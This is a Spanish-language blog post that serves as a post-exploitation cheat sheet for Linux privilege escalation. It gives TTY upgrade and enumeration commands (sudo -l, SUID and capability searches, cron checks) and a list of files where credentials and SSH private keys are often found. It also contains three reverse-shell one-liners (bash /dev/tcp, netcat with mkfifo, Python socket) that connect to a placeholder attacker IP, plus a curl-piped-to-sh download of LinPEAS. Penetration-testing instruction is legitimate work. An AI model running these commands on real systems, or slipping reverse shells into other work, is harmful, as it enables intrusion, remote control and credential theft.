---
layout: post
title: "Escalada de Privilegios en Linux"
date: 2025-02-20
categories: [tutoriales, seguridad]
tags: [privesc, linux, escalada-privilegios, pentesting, post-explotacion]
excerpt: "Técnicas comunes de escalada de privilegios en sistemas Linux"
permalink: /tutoriales/privesc-linux/
---
# PrivEsc en Linux

PrivEsc es la abreviatura de *Privilege Escalation* (escalada de privilegios), un proceso fundamental en la post-explotación de sistemas comprometidos. Este documento sirve como referencia cuando se obtiene acceso a una máquina, ya sea mediante una webshell o un usuario del sistema a través de SSH.

## ✨ Índice

1. 📌 [Contexto](#contexto)
2. 🖥️ [Mejorando la TTY](#mejorando-la-tty)
3. 🔥 [La escalada](#la-escalada)
   - 🔑 [Comprobación de privilegios](#comprobacion-de-privilegios)
   - 🎭 [Permisos SUID](#permisos-suid)
   - ⏰ [Crontabs y archivos sensibles](#crontabs-y-archivos-sensibles)
   - 📊 [Versiones del sistema y sudo](#versiones-del-sistema-y-sudo)
   - 🏗️ [Capabilities](#capabilities)
4. 🎯 [Revershell](#revershell)
5. 🛠️ [Herramientas automáticas](#herramientas-automaticas)
6. ✅ [Checklist](#checklist)
7. 📚 [Recursos](#recursos)

## 📌 Contexto

Si el acceso se ha conseguido a través de una webshell, es recomendable mejorar la interacción con el terminal para optimizar la ejecución de comandos y evitar problemas con la entrada y salida estándar.

## 🖥️ Mejorando la TTY

Para mejorar la TTY al obtener una shell:

- **🎭 Obtener una TTY interactiva**:
  ```sh
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
- **🔧 Establecer el modo de línea canónica y eco de entrada**:
  ```sh
  stty raw -echo
  export TERM=xterm
  ```
- **📏 Mejorar la compatibilidad con ciertas teclas**:
  ```sh
  stty rows 40 cols 100
  ```
- **📝 Habilitar el historial de comandos**:
  ```sh
  script /dev/null -c bash
  ```

## 🔥 La escalada

### 🔑 Comprobación de privilegios

- **🔍 Ver comandos sudo disponibles**:
  ```sh
  sudo -l
  ```
- **🆔 Ver grupos del usuario actual**:
  ```sh
  id
  ```

### 🎭 Permisos SUID

Los permisos SUID permiten ejecutar un binario con los privilegios del propietario del archivo:

```sh
find / -perm -4000 2>/dev/null
# 🎯 Objetivos comunes: find, nmap, vim, bash, nano, more/less, tcpdump
```

También se pueden buscar archivos con permisos de escritura para cualquier usuario:

```sh
find / -writeable 2>/dev/null
```

### ⏰ Crontabs y archivos sensibles

- **🛠️ Buscar tareas cron ejecutadas como root**:
  ```sh
  crontab -l
  cat /etc/crontab
  ```
- **📂 Rutas donde se pueden encontrar credenciales**:
  - 📍 `/opt`
  - 📍 `/tmp | /var/tmp`
  - 📍 `/var/backups`
  - 📍 `/var/mail`
  - 📍 `/var/www/html`
  - 📍 `/dev/shm`
  - 🔐 `/var/www/html/wordpress/wp-config.php`
  - 🔐 `/etc/apache2/.htpasswd`
  - 🕵️ Historial de comandos: `~/.bash_history`, `~/.zsh_history`
  - ⚙️ Archivos de configuración: `*.php`, `*.conf`, `*.yml`
  - 💾 Backups: `/var/backups/*`, `*.bak`, `*.old`
  - 🔑 SSH: `~/.ssh/id_rsa`, `/etc/ssh/sshd_config`
  - 🗄️ Bases de datos: `wp-config.php`, `settings.py`, `*.db`

### 📊 Versiones del sistema y sudo

Verificar información del sistema y la versión de sudo:

```sh
uname -a
lsb_release -a
sudo --version
```

### 🏗️ Capabilities

Las capabilities permiten asignar privilegios específicos sin necesidad de ser root:

```sh
getcap -r / 2>/dev/null
# 🚨 Peligrosas: cap_setuid+ep, cap_dac_read_search+ep
```

## 🎯 Revershell

Si encontramos un RCE y queremos obtener una shell:

```sh
# 🐚 Bash (si /dev/tcp está habilitado)
bash -i >& /dev/tcp/ATACANTE_IP/PUERTO 0>&1

# 🌐 Netcat tradicional
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATACANTE_IP PUERTO >/tmp/f

# 🐍 Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATACANTE_IP",PUERTO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## 🛠️ Herramientas automáticas

LinPEAS es un script útil para la escalada de privilegios:

```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## ✅ Checklist

✅ Verificar `sudo -l` 📋 
✅ Buscar binarios SUID/GUID 🎭 
✅ Analizar tareas cron ⏰ 
✅ Revisar capabilities 🏗️ 
✅ Buscar credenciales expuestas 🔐 
✅ Explotar versiones vulnerables ⚡

## 📚 Recursos

- **🚀 GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)
- **📖 HackTricks**: [https://book.hacktricks.xyz/](https://book.hacktricks.xyz/)
- **💣 PayloadsAllTheThings**: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
